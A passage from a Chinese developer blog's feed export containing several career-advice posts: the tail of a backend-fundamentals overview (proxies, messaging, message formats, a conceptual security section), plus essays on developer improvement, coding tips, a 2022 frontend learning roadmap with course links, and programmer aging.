<p>代理的常见用例是缓存、API 网关、身份验证、负载平衡等等。例如，内容分发网络 (CDN) 是一个向源后端发送请求的反向代理。Fiddler 或 MITM 是在客户端配置的代理，所有请求首先发送给它们。服务网格本质上是代理和反向代理。</p>
<p>我说的是所有请求，但实际上只是代理配置为支持的请求。这里我们主要指的是 HTTP 代理，因此所有 HTTP 请求都会被转发。</p>
<p>代理的例子有 Nginx、HAProxy 和 Envoy。代理是后端工程中最有趣的主题之一，可以专门学习和改进它们。由于 Nginx 的某些限制， Cloudflare 最近放弃了他们的主要反向代理 Nginx，并构建了自己的代理。</p>
<h2 id="消息系统"><a href="#消息系统" class="headerlink" title="消息系统"></a>消息系统</h2><p>随着我们转向互联系统和服务，消息系统变得越来越重要。随着服务开始相互通信，耦合和依赖性增加，这增加了构建可伸缩后端应用程序的复杂性。消息系统旨在消除这种耦合</p>
<p>消息系统的核心支持一种称为发布-订阅的功能，其中客户端可以发布消息，其他客户端可以订阅以使用此内容。构建发布和消费方式的选择取决于消息传递系统。比如 Kafka 采用long-polling模型，RabbitMQ 采用push模型，两者各有利弊。</p>
<p>消费消息还会带来一个有趣且难以解决的问题。您如何确保消费者只阅读一次消息？这些保证使消息传递系统设计复杂化。</p>
<p>消息系统是一项真正有趣的技术，它是后端工程的基础。您可能会对这个领域感兴趣。</p>
<h2 id="消息格式"><a href="#消息格式" class="headerlink" title="消息格式"></a>消息格式</h2><p>消息格式与通信协议密切相关；它们描述了正在发送的消息的线内格式。它们通常分为人类可读和非人类可读两种类型。例如 XML、JSON 和协议缓冲区。</p>
<p>当客户端向后端发送消息时，它需要将消息从语言数据结构序列化为在线消息格式。当后端收到消息时，它需要将消息从这种格式反序列化为语言数据结构。</p>
<p>这就是为什么让 Javascript 客户端使用 JSON 作为消息格式与 C# 后端通信绝对没问题。javascript 的本机 JSON 对象将在线路中转换为 JSON 字节字符串，然后 C# 后端将字节字符串反序列化为表示字典的 C# 结构。了解与序列化和反序列化消息格式相关的成本很重要。</p>
<p>XML 是最初设计为人类可读的消息格式之一。然而，计算机难以处理 XML，因此创建了协议缓冲区格式以使消息格式更小且更友好。协议缓冲区变得非常流行，旨在解决高带宽消息的问题。协议缓冲区最小化有效负载，因此可以发送更少的字节。它还加快了序列化和反序列化过程。</p>
<p>专注于消息格式也是一种选择。您可以发明下一个消息格式，它可能成为未来 50 年为我们服务的标准。</p>
<h2 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h2><p>安全性是软件工程领域的一个重要课题。安全有许多不同的方面。您可以使用加密或 TLS 保护通信。您可以使用防火墙规则和适当的网络配置来防止网络入侵。您可以研究常见的软件漏洞并防止拒绝服务攻击。作为一名软件工程师，熟悉不同类型的安全风险以及如何减轻它们非常重要。</p>
<p>一种类型的安全风险是中间人攻击。这是攻击者拦截两方之间的通信并试图窃听或修改正在交换的数据的地方。为防止此类攻击，使用传输层安全性 (TLS) 对通信方进行加密和身份验证非常重要。</p>
<p>另一种安全风险是拒绝服务攻击。这是攻击者试图阻止合法用户访问服务的地方，方法是通过向服务发送大量请求或通过发送特殊有效负载来寻找使后端崩溃的方法。为防止此类攻击，重要的是要有防火墙或第 7 层 DDOS 保护层来阻止非法请求。Cloudflare 有很好的服务来检测 DDOS 流量。这当然可以通过第 7 层检查来实现。</p>
<p>当然，很难总结所有可能的安全攻击。有客户端安全攻击，如 XSS（跨端脚本），有服务器端安全攻击，如 SQL 注入。</p>
<p>安全性是软件工程领域的一个重要课题。安全有很多方面。作为一名软件工程师，熟悉不同类型的安全风险以及如何减轻它们非常重要。</p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>总之，作为后端工程师，探索不同的技术，找到自己感兴趣的地方，自己的优势在哪里，很重要。不要害怕尝试和构建一些很酷的东西，即使它使用的是一种可能被认为非常规的语言。</p>
<p>我们在本文中讨论的是我认为将始终保留在这里的一些基础知识，了解它们可以使您成为更好的工程师。</p>
<p>随着您获得更多的经验和专业知识，请专注于加深您在特定领域的知识，以便以您在该领域的技能而闻名。最后，跟随您的兴趣在快速发展的软件工程世界中取得成功非常重要。</p>
<p>永远记住，没有什么是一成不变的，你可以改变任何事情。设计或构建应用程序的方法没有对错之分，这完全取决于您要做什么。您可能会遇到我们今天拥有的技术为您所用的情况。但你也可能会走到死胡同，可能需要发明一些以前从未发明过的东西。</p>
<p>刚刚阅读了 Homa 论文，该协议试图完全取代基本协议 TCP，因为数据中心工作负载完全不适合 TCP。</p>
<h2 id="附注"><a href="#附注" class="headerlink" title="附注"></a>附注</h2><p>ACID 学习推荐 <span class="exturl" data-url="aHR0cDovL2drLmxpbmsvYS8xMVJ3bQ==">http://gk.link/a/11Rwm<i class="fa fa-external-link-alt"></i></span> 或 <span class="exturl" data-url="aHR0cDovL2drLmxpbmsvYS8xMVJ2Uw==">http://gk.link/a/11RvS<i class="fa fa-external-link-alt"></i></span></p>
<p>Nginx 学习推荐 <span class="exturl" data-url="aHR0cDovL2drLmxpbmsvYS8xMVJ3MA==">http://gk.link/a/11Rw0<i class="fa fa-external-link-alt"></i></span></p>
<p>Kafka 学习推荐 <span class="exturl" data-url="aHR0cDovL2drLmxpbmsvYS8xMVJ3Mg==">http://gk.link/a/11Rw2<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Career</category>
      </categories>
  </entry>
  <entry>
    <title>为什么有些开发人员永远不会改进？</title>
    <url>/2022/11/career-engineer/</url>
    <content><![CDATA[<h2 id="学如逆水行舟，不进则退"><a href="#学如逆水行舟，不进则退" class="headerlink" title="学如逆水行舟，不进则退"></a>学如逆水行舟，不进则退</h2><p>在快速发展的软件开发领域，不改进就等同于落后。技术日新月异，跟上步伐的人会得到丰厚的回报，而跟不上步伐的人很快就会落伍。在本文中，我将概述开发人员落后的最常见方式以及如何避免它们。</p>
<span id="more"></span>

<h2 id="他们（实际上）不接受反馈"><a href="#他们（实际上）不接受反馈" class="headerlink" title="他们（实际上）不接受反馈"></a>他们（实际上）不接受反馈</h2><p>毫无疑问，建设性反馈是推动开发人员在职业生涯中前进并提升技能水平的主要催化剂。无论是以 Pull Request 反馈、经理反馈、团队反馈的形式，它都可以成为优秀开发人员和优秀开发人员之间的差异制造者。如果开发人员不能有效地接受反馈，他们就会限制他们的技能和潜力。</p>
<p><strong>你可能会想</strong> _“我很擅长接受反馈，我不会独断专行，而且我总是对给我反馈的人很好”_。虽然这是一件好事，但这不是你应该如何接受反馈。反馈应该重新定义您的编码和工程方式，至少在某种程度上是这样。这不是你只在一两个拉取请求中加入的东西，以安抚任何给你批评的人。</p>
<p><strong>以下是您应该如何接受反馈：</strong></p>
<ul>
<li>首先，如果您对此有疑问，<strong>请提出</strong>。 如果您不同意反馈或不理解它，请询问它。 你将无法保留你并不真正理解它的信息，或者更糟糕的是，你真的相信它。 不要对你的代码轻描淡写。</li>
<li>做笔记。 写下这些信息，维护日志或技术日志，记录您的学习情况。 需要的时候您查看您的笔记并做出更好的技术决策。</li>
<li><strong>将建议应用到您的代码</strong>中。 如果您收到的反馈引起您的共鸣，请继续更改您之前编写的代码。 如果您在某段代码中收到它，请超越并将其应用于其他代码。 熟能生巧，你会让代码库变得比它开始时更好。</li>
<li>输出给别人。这个很简单；教学是最好的学习方式。通过教导他人，您将对所学的课程有更深入的了解，并可能在此基础上学到更多。</li>
</ul>
<h2 id="他们不问问题"><a href="#他们不问问题" class="headerlink" title="他们不问问题"></a>他们不问问题</h2><p>软件是一个陌生的领域。许多最有用的知识并不包含在大学讲座、书籍或编程教程中。知识实际上存储在从未写过书的才华横溢且经验丰富的开发人员的头脑中，他们中的大多数人写的都是糟糕的文档。</p>
<p>因此，太害羞或太骄傲而不敢与他人接触并提出问题的开发人员将永远落后于拥有无限库存的好奇开发人员。一个人将在制定行业标准时学习它们，而另一个人可能会在多年后学习它们。</p>
<p>底线是：如果你不知道，就问。不要担心诸如 “_如果我打扰这个开发人员_怎么办？” 之类的事情。或者 “_如果我问，我会看起来很傻吗？_”，因为当那一天到来时你会看起来更愚蠢，你需要那一点信息但没有。</p>
<h2 id="他们避免困难的问题"><a href="#他们避免困难的问题" class="headerlink" title="他们避免困难的问题"></a>他们避免困难的问题</h2><p>使用软件很容易陷入困境。你可以继续做你喜欢做的事情，永远不要挑战自己去解决一个真正复杂的问题。我看到开发人员不断地选择简单的任务，而从来不敢处理困难的任务。困难的问题是你学得最多的问题；您推动自己以不同的方式思考并探索解决这些问题的技术。如果你一直解决同一个简单的问题，那么我保证你会落后于开发人员。</p>
<p>如果你是一个全栈开发人员，经常只接前端任务，那么你猜怎么着？几年后你将只是一名前端开发人员。如果您是只处理小而简单任务的后端开发人员，那么您很快就会忘记如何进行集成或实现复杂的功能。_你失去了你不用的东西_。</p>
<h2 id="他们从不从事自己的项目"><a href="#他们从不从事自己的项目" class="headerlink" title="他们从不从事自己的项目"></a>他们从不从事自己的项目</h2><p>我绝不是说开发人员应该把工作时间之外的每一刻都花在业余项目上，但每个开发人员都应该尝试创建自己的项目。主要原因是没有更好的方法来全面了解系统。在大多数软件工作中，开发人员专注于一个或两个开发领域，这限制了开发人员的机会。从头开始从事一个项目可以填补知识空白，并教会你系统设计、产品管理、集成、身份验证、devops 等知识。</p>
<p>从事业余项目的另一个重要原因是将知识付诸实践。从教程和讲师那里学习是一回事，但是在您自己的项目中实施您的学习是完全不同的。当您从教程中学习时，总会有 “正确” 的答案，并且有人会指导您完成它。当你独自工作时，你必须通过研究和批判性思维为你的案例找到最佳解决方案，这会巩固你内心深处更好的理解。</p>
<h2 id="他们从不改变角色或公司"><a href="#他们从不改变角色或公司" class="headerlink" title="他们从不改变角色或公司"></a>他们从不改变角色或公司</h2><p>当你改变你的角色或改变你的公司时，会发生一些事情：</p>
<ul>
<li>你会接触到可以教你新事物的新队友</li>
<li>您从事的新任务迫使您以不同的方式思考</li>
<li>你使用不同的技术，让你的能力更广，并帮助你为未来的机会堆积你的简历</li>
</ul>
<p>我认为这些开关是学习和改进的巨大动力，可以提高您的编程能力。我将其归因于通过入职培训快速学习新的技术堆栈，并接受一系列新的挑战来推动您的大脑和编程能力。</p>
<h2 id="他们从不切换编程语言"><a href="#他们从不切换编程语言" class="headerlink" title="他们从不切换编程语言"></a>他们从不切换编程语言</h2><p>这可能会误导很多程序员，尤其是那些坚持认为他们的编程语言是_最好的_。事实是，学习和练习不同的语言会产生很多价值。归根结底，编程语言是一种_工具_，您应该选择最适合工作的工具，没有最好的工具时期。拥有更多工具的开发人员更具适应性。</p>
<p>你可能喜欢 Golang 而讨厌 Javascript，但归根结底，Javascript 更适合前端开发。尝试用 Golang 编写前端代码就像尝试用扳手打字一样，它不是完成这项工作的正确工具，尽管它在其他情况下非常有用。同样，如果你必须编写一个高度优化和高性能的应用程序，你通常应该避免使用 python，尽管它不是一种_糟糕_的编程语言，但它只是不适合这项工作。</p>
<p>行业标准和要求经常变化。下图包含随着时间的推移最流行的编程语言的比较。学习不同的编程语言将使您与行业一起转变并始终处于需求之中。</p>
]]></content>
      <categories>
        <category>Career</category>
      </categories>
  </entry>
  <entry>
    <title>提高编程水平的 5 个秘诀</title>
    <url>/2022/11/career-coding/</url>
    <content><![CDATA[<h2 id="多年来，这对我来说已经成为一种“黑客”。"><a href="#多年来，这对我来说已经成为一种“黑客”。" class="headerlink" title="多年来，这对我来说已经成为一种“黑客”。"></a>多年来，这对我来说已经成为一种“黑客”。</h2><p>我会告诉你一些成为高级程序员的秘密，这些秘密多年来对我来说已经成为一个“黑客”——让我把我的职业生涯推向正确的方向。我想补充一点，它们是主观的，有些对某些人来说似乎有争议，但它对我有用。</p>
<h2 id="1-不要只局限于当前的项目"><a href="#1-不要只局限于当前的项目" class="headerlink" title="1. 不要只局限于当前的项目"></a>1. 不要只局限于当前的项目</h2><span id="more"></span>

<p>我喜欢长期项目。它们使您可以改进产品，而不是一个月内快速粘合的小型应用程序，我对干净、编写良好的代码感到非常满意。</p>
<p>唯一不足的是，这么大的项目，我们不可能处处参与。我们经常去一个正在进行的项目，我们从来没有机会从头开始配置我们的项目，创建应用程序的基础，或影响架构。</p>
<p>此外，我们经常被迫在特定的框架内行动，这可能会掩盖我们的灵感。我也不同意一个好的程序员必须在自我发展上花费两倍的钱——那么我们能从生活中得到什么？</p>
<p>然而，我相信在我们真正影响应用程序开发方向的地方创建您自己的小项目是值得的，例如，我们选择什么语言、技术或框架。</p>
<p>“当你拿着锤子时，任何问题看起来都像钉子”——因此，如果不亲自试验，很快就会发现我们只擅长目前正在做的事情。偏离常规流程的任何偏差都可以向我们展示一颗大钉子，但不是我们可以快速钉入的钉子。</p>
<h2 id="2-一个好的程序员是一个懒惰的程序员"><a href="#2-一个好的程序员是一个懒惰的程序员" class="headerlink" title="2. 一个好的程序员是一个懒惰的程序员"></a>2. 一个好的程序员是一个懒惰的程序员</h2><p>我承认，直到最近，我才知道这句话。但是，我听说比尔·盖茨曾经说过，“我总是会选择一个懒惰的人来完成一项艰巨的任务，因为他们会很快找到最简单的解决方案”，老实告诉你——这句话让我很方便地认同.</p>
<p>尽管程序员的职业不是趴着躺着，而是需要我们下定决心去拓宽自己的知识面和逻辑思维，但一点点懒惰可以让我们的生活变得更轻松。</p>
<p>我会告诉你，当我不得不经常为客户测试应用程序时，正是懒惰才开始了我的编程冒险。</p>
<p>里面有很多表格，几个小时后再填，会很单调。我想补充一点，当时我并不知道自动测试的存在，但我可以在 AutoHotKey 中编写简单的脚本。</p>
<h2 id="3-你不需要什么都知道"><a href="#3-你不需要什么都知道" class="headerlink" title="3. 你不需要什么都知道"></a>3. 你不需要什么都知道</h2><p>我遵循的最具争议的规则之一。我知道许多程序员认为，要使用给定的语言进行编程，您必须在开始创建更严肃的东西之前了解基础知识。</p>
<p>这主要是因为大多数面试主要基于理论问题的知识，因为这是筛选人员的最简单方法。这通常会导致有趣的情况，招聘人员可以在没有意识到他们每天都在使用的情况下敲定“协方差”是什么。</p>
<p>我更喜欢问这样的问题：“对于一个类型为 X 的变量，我可以为它分配一个类型为 Y 的对象，假设 X 是类 Y 的基类吗？如果是这样，什么时候有意义？”</p>
<p>这会告诉我一个人的想法，而不是他们是否有良好的记忆力。不要误会我的意思——语言规则非常重要，但我坚持认为它是高级 Medium 开发人员和资深人士应该具备的知识。</p>
<p>我认为与能够在 Angular 中编写正确的结构指令的人一起工作会更愉快，而不是准确地告诉我什么是 JavaScript 原型设计或垃圾收集器如何工作。</p>
<h2 id="4-你做某事，你如何使用它并不那么重要"><a href="#4-你做某事，你如何使用它并不那么重要" class="headerlink" title="4. 你做某事，你如何使用它并不那么重要"></a>4. 你做某事，你如何使用它并不那么重要</h2><p>和我一起工作的人可能都知道这些词，因为有时我会大声回忆它们。您是否曾经花几十分钟与客户讨论按钮在项目中的位置以及它应该如何工作？我参加过太多这种类型的会议。</p>
<p>让我们假设一个简单的情况：我们有一个无法发送的表单，因为某些数据不正确。此外，客户没有准确描述标准中应该发生什么。</p>
<p>决定一件简单的事情，客户和我们的精力花费了多少钱，更不用说实施所需的额外时间了？</p>
<p>有时这种情况对我们来说似乎是显而易见的，但对客户来说不一定是这样——因此，他会尝试适应，快速制定解决方案，随机选择一些东西或退出。另一方面，有时候让他承担这样的问题并采取主动是不值得的。</p>
<h2 id="5-与更好的人一起工作"><a href="#5-与更好的人一起工作" class="headerlink" title="5. 与更好的人一起工作"></a>5. 与更好的人一起工作</h2><p>最直截了当的秘密，但实现起来是多么的困难，尤其是当我们在一个项目中有一份温暖的工作时，那是一种绿地。</p>
<p>我们从一开始就共同创建应用程序；每个人都会考虑我们的意见。我们是决策者，以至于每个人都相信我们的话，我们不会引入任何变化。会好的。只有优点——我们做自己喜欢做的事并且擅长做，那么为什么要改变一些东西呢？</p>
<p>首先，值得考虑其中的陷阱。当我们在项目中拥有如此强大的地位时，大多数人都过于信任我们——这导致了奇怪的情况，尤其是当团队中其他开发人员的警惕性可能在代码审查期间处于休眠状态时：“因为他总是扫荡，它会如果有什么东西引起了我的注意，就滚动一下。” 我们忘记了没有人是绝对可靠的。</p>
<p>单调也很容易渗透到工作中，这是我们同意忍受的，尽管它可能会慢慢地让我们在职业上精疲力竭。然而，我从分析中知道，最好的想法——以及绝妙解决方案的发现——来自于与其他开发人员的讨论（有时会变成争吵），因为每个人都有自己的观点，而他们所有人的冲突引起了许多想法。</p>
<p>我喜欢这种感觉，在激烈的谈话之后，每个人都感到满足，因为我们达成了协议并找到了一个让每个人都满意的有效解决方案。</p>
]]></content>
      <categories>
        <category>Career</category>
      </categories>
  </entry>
  <entry>
    <title>前端开发者路线图（2022 年版）</title>
    <url>/2022/11/career-frontend-map/</url>
    <content><![CDATA[<h2 id="前端开发人员路线图是成为前端开发人员的指南。"><a href="#前端开发人员路线图是成为前端开发人员的指南。" class="headerlink" title="前端开发人员路线图是成为前端开发人员的指南。"></a>前端开发人员路线图是成为前端开发人员的指南。</h2><p>在过去的八年里，我一直是一名 Web 开发人员。我写这篇文章是因为我收到了很多想成为 Web 开发人员或正在学习 Web 开发的人的问题。</p>
<p>朋友们大家好，希望你们在 2022 年一切顺利。我相信你们现在都已经实现了自己的目标。这是为大家准备的 2022 Web 发展路线图。到今年年底，您将能够学习从 HTML、CSS 和 JavaScript 的基础知识到成为成熟的前端开发人员的一切。</p>
<span id="more"></span>

<blockquote>
<p>路线图涵盖前端开发，包括教程、文章和资源的组合。</p>
</blockquote>
<h2 id="前端开发者路线图"><a href="#前端开发者路线图" class="headerlink" title="前端开发者路线图"></a>前端开发者路线图</h2><p>要成为一名成功的前端开发人员，您必须对 HTML、CSS 和 JavaScript 有深入的了解。您还应该熟悉 React 或 Angular 等框架和 jQuery 等库。</p>
<h2 id="Web-开发基础"><a href="#Web-开发基础" class="headerlink" title="Web 开发基础"></a>Web 开发基础</h2><p>如果您想成为 Web 开发人员，很明显您应该了解 HTML、CSS 和 JavaScript 的基础知识。这是构建 Web 应用程序的三种最重要的技术，它们不会很快消失。</p>
<p>要成为 Web 开发人员，不仅仅了解这些技术。您还需要能够使用各种工具和框架，并深入了解 Web 的工作原理。但如果您刚开始，HTML、CSS 和 JavaScript 是您应该首先关注的三件事。</p>
<h2 id="HTML-和-CSS"><a href="#HTML-和-CSS" class="headerlink" title="HTML 和 CSS"></a>HTML 和 CSS</h2><p>HTML 和 CSS 是任何网站的基本构建块。这两种语言对于任何 Web 开发人员来说都是必不可少的。如果没有这两种语言，网站将是一堆杂乱无章的文本和图像。但是使用 HTML 和 CSS，您可以控制站点的布局、字体、颜色和整体外观。</p>
<p>如果您刚开始，请不要担心学习所有不同的标签和属性。只需专注于对两种语言如何协同工作有一个基本的了解。一旦你掌握了它，你就可以开始尝试更高级的技术。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1wUU4tcG5YUGFWZw==">HTML全教程——建站教程<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1xejBhR1lycmxoVQ==">HTML 初学者教程：HTML 速成班<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1ELWg4TDVoZ1ctdw==">HTML 和 CSS 教程<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1GcW1CLVpqMi1QQQ==">CSS 大师班 — 初学者教程和课程<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY29kZWNhZGVteS5jb20vbGVhcm4vbGVhcm4tY3Nz">学习 CSS | 代码学院<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><p>面向对象编程有四个主要支柱：抽象、封装、多态和继承。每个概念代表一种不同的思考和处理代码的方式。</p>
<p><strong>抽象</strong>是对外界隐藏实现细节的过程。目标是通过隔离代码的复杂性，使代码更易于理解和使用。在许多情况下，这意味着创建仅公开使用它们的原则所需功能的接口。</p>
<p><strong>封装</strong>是将数据和功能捆绑到一个单元中的过程。这有助于通过将相关代码放在一个地方来降低复杂性。它还使重用代码变得更加容易，因为所有必要的部分都是独立的。</p>
<p><strong>多态性</strong>是对象根据使用它的上下文而呈现不同形式的能力。</p>
<p><strong>继承</strong>和多态性通常一起使用来创建模块化、可重用和可扩展（即添加新功能的能力）的系统。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9qYXZhc2NyaXB0LmluZm8v">现代 JavaScript 教程<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3dvcmtzaG9wcGVyL2phdmFzY3JpcHRpbmc=">学习 JavaScript 的基础知识<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h2 id="TypeScript"><a href="#TypeScript" class="headerlink" title="TypeScript"></a>TypeScript</h2><p>TypeScript 是 JavaScript 的类型化超集，可编译为纯 JavaScript。这意味着任何有效的 JavaScript 代码也是有效的 TypeScript 代码。但是 TypeScript 添加了一些额外的特性，使其比 JavaScript 更强大。例如，TypeScript 支持类和模块，这有助于更好地组织代码。而且由于 TypeScript 是静态类型的，它可以在编译时而不是运行时捕获错误。</p>
<p>那么为什么 TypeScript 没有比 JavaScript 更流行呢？原因之一可能是它不太为人所知。</p>
<blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudWRlbXkuY29tL2NvdXJzZS91bmRlcnN0YW5kaW5nLXR5cGVzY3JpcHQv">理解 TypeScript — 2022 年版<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<h2 id="Angular"><a href="#Angular" class="headerlink" title="Angular"></a>Angular</h2><p>大多数网站开发使用 HTML、CSS 和 JavaScript 的组合。然而，情况并非总是如此。在互联网的早期，大多数网站都是仅使用 HTML 和 CSS 构建的。这是因为 JavaScript 尚未被 Web 浏览器广泛使用和支持。</p>
<p>今天，JavaScript 是世界上最流行的编程语言之一。数百万开发人员使用它来构建交互式 Web 应用程序。要成为 Web 开发人员，您需要学习 JavaScript。</p>
<p>Angular 是一种流行的 Web 开发前端框架。该框架由谷歌提供支持，这意味着它会不断更新最新的 Web 技术。这使得 Angular 成为任何现代 Web 开发人员的不错选择。</p>
<blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudWRlbXkuY29tL2NvdXJzZS90aGUtY29tcGxldGUtZ3VpZGUtdG8tYW5ndWxhci0yLw==">Angular 完整指南<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<h2 id="React-JS"><a href="#React-JS" class="headerlink" title="React JS"></a>React JS</h2><p>Angular 和 React 都是用于开发 Web 应用程序的流行库。它们都允许您创建动态且响应迅速的用户界面。Angular 是一个成熟的框架，而 React 是一个库。这意味着 Angular 比 React 具有更多的内置特性和功能。然而，React 通常比 Angular 更容易学习和使用。</p>
<p>React 是一个流行的 JavaScript 库，用于开发 Web 应用程序。与 Angular 一样，React 允许您创建可重用的组件并管理应用程序的状态。React 通常与后端框架一起使用，例如 Node.js 或 Express。</p>
<blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudWRlbXkuY29tL2NvdXJzZS9yZWFjdC10aGUtY29tcGxldGUtZ3VpZGUtaW5jbC1yZWR1eC8=">React 完整指南<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<h2 id="Vue-js"><a href="#Vue-js" class="headerlink" title="Vue.js"></a>Vue.js</h2><p>Vue.JS 框架在过去一年中在 Web 开发人员中流行起来。这个 JavaScript 框架易于学习和使用，并且与 AngularJS 等其他框架相比占用空间小。此外，Vue.JS 具有双向数据绑定的能力，可用于前端和后端开发。随着越来越受欢迎，越来越多的人推荐 Vue.JS 作为 Web 开发项目的绝佳选择。</p>
<p>我认为部分原因在于它重量轻、易于使用且易于上手。它的另一个优点是您可以将它用作渐进式框架，这意味着您可以在现有项目中开始使用它，而不必从头开始重写所有内容。这使得已经使用不同框架的公司更容易采用。</p>
<blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudWRlbXkuY29tL2NvdXJzZS92dWVqcy0yLWVzc2VudGlhbHMv">Vue.js Essentials — 3 个课程包<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>技术的的开发最终还是要落地，这儿有两个项目实战教程：</p>
<ol>
<li><span class="exturl" data-url="aHR0cHM6Ly9rZS5xcS5jb20vY291cnNlLzQxNTgwNjI/c2FsZVRva2VuPTI2OTU2MTYmZnJvbT1wY2xpbms=">uni-app实战在线教育类app开发<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9rZS5xcS5jb20vY291cnNlLzU4NTAxMTg/c2FsZVRva2VuPTI2OTU2NjYmZnJvbT1wY2xpbms=">Vue3+Nuxt3实战在线教育SSR网站<i class="fa fa-external-link-alt"></i></span></li>
</ol>
<p>最后，您需要学习许多技能。该路线图提供了一个很好的起点，但请记住，学习是一个永无止境的过程。保持积极性并始终乐于学习新事物，您将走上成功的前端开发人员职业道路。</p>
]]></content>
      <categories>
        <category>Career</category>
      </categories>
  </entry>
  <entry>
    <title>前端编程迭代</title>
    <url>/2022/11/career-frontend/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>项目开发又是忙碌的一天。今天来和大家聊聊前端项目开发的变化。我刚接触前端开发的时候，那时候用的Dreamweaver，这款软件是Adobe公司开发的。</p>
<p>利用对Html、Css、Javascript的支持，可以快速开发网站应用。因为代码是软件生成的，所以有些代码比较臃肿。</p>
<span id="more"></span>

<p>对于硬核的程序员来说，过多的代码没有意义，很多人使用编辑器直接写代码。后来为了网页的SEO，搜索引擎优化，Tabel标签用的少了，基本上都是Div+Css来布局页面格式。</p>
<p>上面说的是布局的变化，接下来说说Javascript的变化。我记得几年前，很多人认为写原生的Javascript代码才是大神，但是开发项目的还是得Jquery，所以专业精神虽然是好的，但是项目开发还是要快速、安全、专业。</p>
<p>随着Jquery的发展，一坨一坨的Dom操作代码，随处可见，杂乱不堪。就出来Vue、React、Angular这样的人组件式开发框架。从之前的面向Dom编程转向面向数据编程，直接面对数据，省去了Dom操作，开发变得方便、快速、简单！</p>
<p>路漫漫其修远兮，吾将上下而求索。以后还会出现更方便，更加简洁，更加优秀的技术、框架、思想。殊途同归，都是为了提高生产力，为了广大程序员创造出更加优秀的项目。</p>
]]></content>
      <categories>
        <category>Career</category>
      </categories>
  </entry>
  <entry>
    <title>一件事告诉你你太老了不能当程序员</title>
    <url>/2022/11/career-too-old/</url>
    <content><![CDATA[<h2 id="它发生在我们所有人身上"><a href="#它发生在我们所有人身上" class="headerlink" title="它发生在我们所有人身上"></a>它发生在我们所有人身上</h2><p>年龄增长伴随着我们所有人。头发略少，腰围略多。</p>
<p>这些<em><strong>并不是</strong></em>告诉您您已经不适合从事开发职业的事情。当你变成那个阻止团队发挥潜力的脾气暴躁的影子时，这就很难说了。</p>
<span id="more"></span>

<p>但这里有一些随着年龄的增长而发展起来的<em><strong>良好</strong></em>品质和能力，它们会让你成为更好的程序员。</p>
<h2 id="智慧"><a href="#智慧" class="headerlink" title="智慧"></a>智慧</h2><p>随着年龄的增长，你已经看到了这一切。</p>
<p><em><strong>以积极的方式</strong></em></p>
<p>您知道软件开发中会发生哪些事情，以及如何解决它们。</p>
<blockquote>
<p>不过，我认为我从未遇到过积极的开发者</p>
</blockquote>
<h2 id="耐心"><a href="#耐心" class="headerlink" title="耐心"></a>耐心</h2><p>我没有时间，也懒得理会。</p>
<blockquote>
<p>我们都知道那种感觉</p>
</blockquote>
<h2 id="团队合作"><a href="#团队合作" class="headerlink" title="团队合作"></a>团队合作</h2><p>我是最好的，我是最好的，我是最好的。我被你们所有人拖住了。</p>
<p><em><strong>这可能是真的。你可能是对的</strong></em></p>
<p>我想你知道你是不对的。在深处。您是解决方案的一部分，还是问题的一部分，这取决于您与同事的合作情况。作为一个团队，您需要共同努力解决工作环境中出现的问题。谁是最好的（根据你的定义）并不重要，不是吗？</p>
<h2 id="什么特征说明你太老了"><a href="#什么特征说明你太老了" class="headerlink" title="什么特征说明你太老了"></a>什么特征说明你太老了</h2><h2 id="缺乏好奇心"><a href="#缺乏好奇心" class="headerlink" title="缺乏好奇心"></a>缺乏好奇心</h2><p>导致<strong>缺乏兴趣</strong></p>
<p>我希望这没有发生在你身上。你不能在会议期间集中注意力。他们太无聊了。</p>
<blockquote>
<p>我作为开发人员的第一天就有了</p>
</blockquote>
<p>与其考虑您的业务如何运作，不如考虑晚餐可能想吃什么。其他开发人员开始以比您快得多的速度掌握相关问题。</p>
<p><em><strong>不仅仅是感觉你不在乎了</strong></em></p>
<p>也就是说，缺乏好奇心会导致糟糕的工作输出（重构？其他人编写了代码，所以他们应该修复它）。</p>
<blockquote>
<p>脾气暴躁是可选的</p>
</blockquote>
<p><strong>不在你的车道外工作</strong></p>
<p>也许您是一名后端开发人员，但对前端不再感兴趣（反之亦然）。</p>
<p><strong>缺乏好奇心</strong></p>
<p>思考事物的运作方式并激发您的好奇心总是很棒的。您想知道正在进行什么会议。您组织内的其他开发人员在做什么？</p>
<p>如果你不好奇，那么你就不知道你的公司里还会发生什么。当其他开发人员在休假或休假时，您无法为其填补空缺。</p>
<p>如果您对公司中发生的事情感到好奇，那么您就是一个更好的开发人员、团队合作者和同事。</p>
<blockquote>
<p>毕竟这也是你的事</p>
</blockquote>
